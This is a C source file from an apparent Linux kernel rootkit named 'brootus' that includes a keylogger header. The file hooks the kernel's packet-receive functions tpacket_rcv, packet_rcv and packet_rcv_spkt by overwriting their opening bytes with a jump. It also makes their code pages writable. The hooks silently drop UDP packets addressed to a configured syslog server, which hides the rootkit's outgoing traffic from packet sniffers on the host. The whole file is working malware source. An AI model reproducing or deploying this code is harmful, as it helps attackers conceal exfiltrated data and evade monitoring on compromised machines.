#include <linux/kernel.h>
#include <net/ip.h>

#include "kernel_functions.h"
#include "syscall.h"
#include "keylogger.h"
#include "packet_hiding.h"

#define JUMP_CODE_SIZE 6
#define JUMP_CODE_ADDR_OFFSET 1

// x86 assembler for:
// push $0x00000000 ; address to be adjusted
// ret
//
// These instructions result in a jump to the absolute address
// without destroying any register values
char jump_code[JUMP_CODE_SIZE] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
unsigned int* jump_addr = (unsigned int*) (jump_code + JUMP_CODE_ADDR_OFFSET);

// A lock to avoid interfering of hooking and restoring (especially
// when calling the original funcion)
spinlock_t hook_lock;

/* =================================================================== */

/*
 * Make excessive use of macros to avoid duplicate code for each
 * hooked function. Might be a little over the top...
 */

// Macro for the variables
// We need the original code, the original page permissions, and
// the prototype declaration for the replacement function
#define VARIABLES_FOR(__fn) \
char original_code_##__fn[JUMP_CODE_SIZE]; \
int original_pte_##__fn; \
int brootus_##__fn(struct sk_buff* skb, struct net_device* dev, \
                   struct packet_type* pt, struct net_device* orig_dev);

// Hook a function by inserting the jump code at the beginning
// while maintainig a backup of the original code
#define HOOK_FUNCTION(__fn) \
void hook_##__fn(void) \
{ \
  spin_lock(&hook_lock); \
  *jump_addr = (unsigned int) brootus_##__fn; \
  memcpy(original_code_##__fn, fn_##__fn, JUMP_CODE_SIZE); \
  memcpy(fn_##__fn, jump_code, JUMP_CODE_SIZE); \
  spin_unlock(&hook_lock); \
}

// Restore a function by copying the original code
#define RESTORE_FUNCTION(__fn) \
void restore_##__fn(void) \
{ \
  spin_lock(&hook_lock); \
  memcpy(fn_##__fn, original_code_##__fn, JUMP_CODE_SIZE); \
  spin_unlock(&hook_lock); \
}

// Macro for the hooked receive functions
// Return 0 if we want to hide the packet, call original function otherwise
#define BROOTUS_RCV(__fn) \
int brootus_##__fn(struct sk_buff* skb, struct net_device* dev, \
                   struct packet_type* pt, struct net_device* orig_dev) \
{ \
  int ret; \
  if (is_syslog_packet(skb)) return 0; \
  CALL_ORIGINAL(__fn); \
  return ret; \
}

// Call the original function by restoring the function code temporarily
#define CALL_ORIGINAL(__fn) \
restore_##__fn(); \
ret = fn_##__fn(skb, dev, pt, orig_dev); \
hook_##__fn();

// Combine all these
#define HOOKING_FOR(__fn) \
VARIABLES_FOR(__fn) \
HOOK_FUNCTION(__fn) \
RESTORE_FUNCTION(__fn) \
BROOTUS_RCV(__fn)

#define PAGE_WRITABLE(__fn) \
original_pte_##__fn = set_addr_rw((unsigned int) fn_##__fn);

#define RESTORE_PAGE(__fn) \
set_pte_permissions((unsigned int) fn_##__fn, original_pte_##__fn);

/* =================================================================== */

// Check if we should hide this packet
int is_syslog_packet(struct sk_buff* skb)
{
  //Check if the packet is IPv4
  if (skb->protocol == htons(ETH_P_IP)) {
    // Extract the IP header
    struct iphdr* iph = (struct iphdr*) skb_network_header(skb);

    // Check if the packet is for our syslog server and UDP
    if (iph->protocol == IPPROTO_UDP && iph->daddr == syslog_ip_bin) {

      // Extract the UDP header
      struct udphdr* udph = (struct udphdr*) (iph + 1);

      // Check the destination port
      if (udph->dest == htons(syslog_port_bin)) {
        return 1;
      }
    }
  }
  return 0;
}

/*
 * The generated functions
 */
HOOKING_FOR(tpacket_rcv);
HOOKING_FOR(packet_rcv);
HOOKING_FOR(packet_rcv_spkt);


void enable_packet_hiding(void)
{
  hook_tpacket_rcv();
  hook_packet_rcv();
  hook_packet_rcv_spkt();
}

void disable_packet_hiding(void)
{
  restore_tpacket_rcv();
  restore_packet_rcv();
  restore_packet_rcv_spkt();
}

void init_packet_hiding(void)
{
  // Allow writes to the page which contains the function to hook
  PAGE_WRITABLE(tpacket_rcv);
  PAGE_WRITABLE(packet_rcv);
  PAGE_WRITABLE(packet_rcv_spkt);

  enable_packet_hiding();
}

void finalize_packet_hiding(void)
{
  disable_packet_hiding();

  // Restore page permissions
  RESTORE_PAGE(tpacket_rcv);
  RESTORE_PAGE(packet_rcv);
  RESTORE_PAGE(packet_rcv_spkt);
}

